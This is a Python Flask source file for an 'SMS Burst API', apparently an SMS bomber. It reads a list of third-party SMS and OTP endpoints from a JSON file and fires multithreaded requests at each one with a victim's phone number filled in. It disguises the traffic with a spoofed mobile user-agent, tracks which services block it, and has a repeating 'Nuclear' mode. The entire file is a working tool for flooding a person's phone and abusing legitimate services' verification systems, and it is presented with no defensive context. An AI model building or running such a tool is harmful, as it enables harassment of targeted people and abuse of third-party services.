"""
SMS Burst API — Simple Edition
No complex DB for jobs. Just: authenticate → fire → done.
One endpoint to start, one to check health.
"""

import json
import threading
import time
import os
import secrets
import requests
import logging
from flask import Flask, request, jsonify
from functools import wraps
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

# ── Config ────────────────────────────────────────────────────────────────────
API_KEY      = os.environ.get("MASTER_API_KEY", "render12345")   # Set this in Render env vars
MAX_THREADS  = int(os.environ.get("MAX_THREADS", 10))

# ── In-memory job store (simple, single-instance) ────────────────────────────
jobs = {}   # job_id → { status, sent, logs, started_at }
jobs_lock = threading.Lock()

# ── Auth decorator ────────────────────────────────────────────────────────────
def require_key(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        key = request.headers.get("X-API-Key", "").strip()
        if not key or key != API_KEY:
            return jsonify({"error": "Invalid or missing X-API-Key"}), 403
        return f(*args, **kwargs)
    return wrapper

# ── Load SMS services from apidata.json ───────────────────────────────────────
def load_services():
    try:
        path = os.path.join(os.path.dirname(__file__), "apidata.json")
        with open(path, "r") as f:
            return json.load(f).get("sms", {}).get("91", [])
    except Exception as e:
        logging.error(f"Failed to load apidata.json: {e}")
        return []

# ── Single SMS fire ───────────────────────────────────────────────────────────
def fire(service, phone, session, job_id):
    try:
        url    = service["url"].replace("{target}", phone)
        method = service.get("method", "POST").upper()
        raw    = json.dumps(service.get("data", {})).replace("{target}", phone)
        data   = json.loads(raw)
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
        res = session.request(method, url, json=data if method != "GET" else None,
                              params=data if method == "GET" else None,
                              headers=headers, timeout=5)
        name = service.get("name", "svc")[:12]
        with jobs_lock:
            if job_id in jobs:
                if res.status_code < 300:
                    jobs[job_id]["sent"] += 1
                    jobs[job_id]["logs"].insert(0, f"✅ {name} OK")
                elif res.status_code == 403:
                    jobs[job_id]["logs"].insert(0, f"🚫 {name} blocked")
                else:
                    jobs[job_id]["logs"].insert(0, f"⚠️ {name} {res.status_code}")
                # Keep last 30 logs
                jobs[job_id]["logs"] = jobs[job_id]["logs"][:30]
    except Exception as e:
        with jobs_lock:
            if job_id in jobs:
                jobs[job_id]["logs"].insert(0, f"💥 {service.get('name','svc')[:12]} err")

# ── Job runner ────────────────────────────────────────────────────────────────
def run_job(job_id, targets, mode, delay, max_requests):
    services = load_services()
    if not services:
        with jobs_lock:
            jobs[job_id]["status"] = "done"
            jobs[job_id]["logs"] = ["❌ No services loaded from apidata.json"]
        return

    semaphore = threading.Semaphore(MAX_THREADS)

    with requests.Session() as s:
        sent_total = 0
        for phone_raw in targets:
            phone = str(phone_raw).strip()
            if len(phone) < 10:
                continue

            for svc in services:
                # Check if stopped
                with jobs_lock:
                    if jobs.get(job_id, {}).get("status") == "stopped":
                        return
                    sent_total = jobs[job_id]["sent"]

                if sent_total >= max_requests:
                    break

                semaphore.acquire()
                def _go(sv=svc, ph=phone):
                    try:
                        fire(sv, ph, s, job_id)
                    finally:
                        semaphore.release()
                threading.Thread(target=_go, daemon=True).start()
                time.sleep(delay)

            # After one pass through all services per target, check Nuclear mode
            if mode != "Nuclear":
                break  # Normal/Ghost: one pass only

        # Wait for all threads to finish
        for _ in range(MAX_THREADS):
            semaphore.acquire()

    with jobs_lock:
        if job_id in jobs and jobs[job_id]["status"] == "running":
            jobs[job_id]["status"] = "done"

    logging.info(f"Job {job_id} done. Sent: {jobs.get(job_id,{}).get('sent',0)}")

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/health")
def health():
    return jsonify({"status": "ok", "ts": datetime.utcnow().isoformat(), "active_jobs": len(jobs)})

@app.route("/api/job/start", methods=["POST"])
@require_key
def start_job():
    """
    POST /api/job/start
    Headers: X-API-Key: render12345
    Body:
    {
        "targets": ["9977885544"],
        "mode": "Normal",
        "delay": 0.5,
        "max_requests": 10
    }
    """
    body = request.get_json(force=True, silent=True) or {}

    # Parse targets
    raw = body.get("targets", [])
    if isinstance(raw, str):
        targets = [t.strip() for t in raw.split(",") if t.strip()]
    else:
        targets = [str(t).strip() for t in raw if str(t).strip()]

    if not targets:
        return jsonify({"error": "targets required — list of phone numbers"}), 400

    mode         = str(body.get("mode", "Normal"))
    delay        = float(body.get("delay", 0.5))
    max_requests = int(body.get("max_requests", 10))

    # Clamp values
    delay        = max(0.1, min(delay, 60.0))
    max_requests = max(1, min(max_requests, 1000))

    job_id = secrets.token_hex(8)

    with jobs_lock:
        jobs[job_id] = {
            "job_id":       job_id,
            "status":       "running",
            "sent":         0,
            "logs":         [],
            "targets":      targets,
            "mode":         mode,
            "delay":        delay,
            "max_requests": max_requests,
            "started_at":   datetime.utcnow().isoformat()
        }

    threading.Thread(
        target=run_job,
        args=(job_id, targets, mode, delay, max_requests),
        daemon=True
    ).start()

    logging.info(f"Job {job_id} started: targets={targets} mode={mode} delay={delay} max={max_requests}")

    return jsonify({
        "job_id":       job_id,
        "status":       "running",
        "targets":      len(targets),
        "mode":         mode,
        "delay":        delay,
        "max_requests": max_requests
    }), 202


@app.route("/api/job/<job_id>", methods=["GET"])
@require_key
def job_status(job_id):
    """GET /api/job/<job_id>"""
    with jobs_lock:
        job = jobs.get(job_id)
    if not job:
        return jsonify({"error": "Job not found"}), 404
    return jsonify(job)


@app.route("/api/job/<job_id>/stop", methods=["POST"])
@require_key
def stop_job(job_id):
    """POST /api/job/<job_id>/stop"""
    with jobs_lock:
        if job_id not in jobs:
            return jsonify({"error": "Job not found"}), 404
        jobs[job_id]["status"] = "stopped"
    return jsonify({"job_id": job_id, "status": "stopped"})


@app.route("/api/jobs", methods=["GET"])
@require_key
def list_jobs():
    """GET /api/jobs — list all jobs"""
    with jobs_lock:
        result = [
            {k: v for k, v in j.items() if k != "logs"}
            for j in jobs.values()
        ]
    return jsonify(sorted(result, key=lambda x: x.get("started_at",""), reverse=True)[:20])


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), threaded=True)
